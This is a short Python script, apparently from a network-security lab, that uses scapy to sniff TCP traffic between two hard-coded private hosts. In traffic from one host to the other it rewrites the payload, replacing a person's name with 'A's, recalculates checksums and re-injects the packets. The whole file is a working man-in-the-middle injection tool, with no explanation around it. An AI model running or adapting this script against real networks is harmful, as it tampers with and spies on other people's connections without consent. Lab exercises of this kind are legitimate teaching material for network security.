#!/usr/bin/env python3
#POC for TCP data injection in netcat
#task: replace name with "A"s where len(name) = number of A's

from scapy.all import *
import re

IP_A = "10.0.2.7"
MAC_A = "08:00:27:9f:82:d4"
IP_B = "10.0.2.6"
MAC_B = "08:00:27:ba:31:c6"
def spoof_pkt(pkt):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
                newpkt = IP(bytes(pkt[IP]))
                del(newpkt.chksum)
                del(newpkt[TCP].payload)
                del(newpkt[TCP].chksum)

#logic to replace name with series of A's
                if pkt[TCP].payload:
                        data = pkt[TCP].payload.load
                        newdata = data.replace(b'Harshit',b'AAAAAAA')
                        print("Replaced data: ", data," with: ", newdata)
                        send(newpkt/newdata, verbose = False)
                else:
                        send(newpkt, verbose = False)
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
                newpkt = IP(bytes(pkt[IP]))
                del(newpkt.chksum)
                del(newpkt[TCP].chksum)
                send(newpkt, verbose = False)

pkt = sniff(iface='eth0',filter = 'tcp',prn=spoof_pkt)
